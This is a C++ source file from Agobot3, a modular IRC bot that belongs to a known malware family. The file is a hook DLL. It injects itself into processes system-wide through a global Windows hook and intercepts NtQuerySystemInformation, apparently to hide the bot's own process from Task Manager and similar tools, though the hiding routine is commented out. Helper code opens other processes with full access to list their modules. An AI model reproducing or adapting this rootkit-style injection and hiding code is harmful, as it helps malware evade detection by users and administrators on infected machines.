/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <shlwapi.h>
#include <winternl.h>
#include "hookdll.h"
#include "apihijack.h"

HINSTANCE	g_hDLL=NULL;
#pragma data_seg (".hook")
HHOOK		g_hHook=NULL;
char		g_szFilename[MAX_PATH];
#pragma data_seg ()

HMODULE EnumModules(int pid, const char *szLibFile)
{	HMODULE hMods[1024]; DWORD cbNeeded; unsigned int i;
	HANDLE hProcess=::OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if(!hProcess) return 0; HMODULE m_hModPSAPI=::LoadLibraryA("PSAPI.DLL");
	
	typedef BOOL (WINAPI *PFNENUMPROCESSMODULES)(HANDLE hProcess, HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded);
	typedef DWORD (WINAPI *PFNGETMODULEFILENAMEEXA)(HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize);
    PFNENUMPROCESSMODULES   m_pfnEnumProcessModules=(PFNENUMPROCESSMODULES)::GetProcAddress(m_hModPSAPI, "EnumProcessModules");
	PFNGETMODULEFILENAMEEXA m_pfnGetModuleFileNameExA=(PFNGETMODULEFILENAMEEXA)::GetProcAddress(m_hModPSAPI, "GetModuleFileNameExA");

	if(m_pfnEnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
		for(i=0; i<(cbNeeded/sizeof(HMODULE)); i++) {
			char szModName[MAX_PATH];
			if(m_pfnGetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
				PathStripPath(szModName);
				if(!stricmp(szModName, szLibFile)) {
					if(hProcess!=NULL) ::CloseHandle(hProcess);
					return hMods[i];
				}
			}
		}
	}
	
	if(hProcess!=NULL) ::CloseHandle(hProcess);
	return 0;
}

typedef NTSTATUS (*NtQuerySystemInformation_t)(	SYSTEM_INFORMATION_CLASS SystemInformationClass, \
												void *pSystemInformation, \
												unsigned long lSystemInformationLength, \
												unsigned long *lReturnLength);

NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, \
									void *pSystemInformation, \
									unsigned long lSystemInformationLength, \
									unsigned long *lReturnLength);
enum {
    NTDLL_NtQuerySystemInformation=0
};

SDLLHook NTDLLHook={
	"NTDLL.DLL", false, NULL, {
		{ "NtQuerySystemInformation", MyNtQuerySystemInformation },
		{ NULL, NULL }
	}
};

NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, \
									void *pSystemInformation, \
									unsigned long lSystemInformationLength, \
									unsigned long *lReturnLength) {
    NtQuerySystemInformation_t pfnOld=(NtQuerySystemInformation_t)NTDLLHook.Functions[NTDLL_NtQuerySystemInformation].OrigFn;
	NTSTATUS ntRet=pfnOld(SystemInformationClass, pSystemInformation, lSystemInformationLength, lReturnLength);

/*	if(SystemInformationClass==SystemProcessInformation) {
		SYSTEM_PROCESS_INFORMATION *pProcessInfo=(SYSTEM_PROCESS_INFORMATION*)pSystemInformation;
		SYSTEM_PROCESS_INFORMATION *pLastProcessInfo=NULL;
		while(pProcessInfo) {
			char szFilename[MAX_PATH];
			HMODULE hProcess=EnumModules((int)pProcessInfo->UniqueProcessId, g_szFilename);
			GetModuleFileName(hProcess, szFilename, sizeof(szFilename));

			if(!stricmp(szFilename, g_szFilename)) {
				pLastProcessInfo->NextEntryOffset=pProcessInfo->NextEntryOffset;
			}

			pLastProcessInfo=pProcessInfo;
			pProcessInfo=(SYSTEM_PROCESS_INFORMATION*)pSystemInformation + \
				(int)pProcessInfo->NextEntryOffset;
		}
	}*/

	return ntRet; }

bool APIENTRY DllMain(HINSTANCE hModule, unsigned long fdwReason, void *lpReserved) {
	char szBuf[MAX_PATH]; if(fdwReason==DLL_PROCESS_ATTACH) {
		g_hDLL=hModule; DisableThreadLibraryCalls(hModule);
		GetModuleFileName(GetModuleHandle(NULL), szBuf, sizeof(szBuf));
		PathStripPath(szBuf); // if(!stricmp(szBuf, "taskmgr.exe"))
		HookAPICalls(&NTDLLHook);
	} return true; }

HOOKDLL_API LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
	return CallNextHookEx(g_hHook, nCode, wParam, lParam); }

HOOKDLL_API void InstallHook(const char *szFilename) {
	strncpy(g_szFilename, szFilename, sizeof(g_szFilename));
	g_hHook=SetWindowsHookEx(WH_CBT, HookProc, g_hDLL, 0); }

HOOKDLL_API void RemoveHook() {
	UnhookWindowsHookEx(g_hHook); }
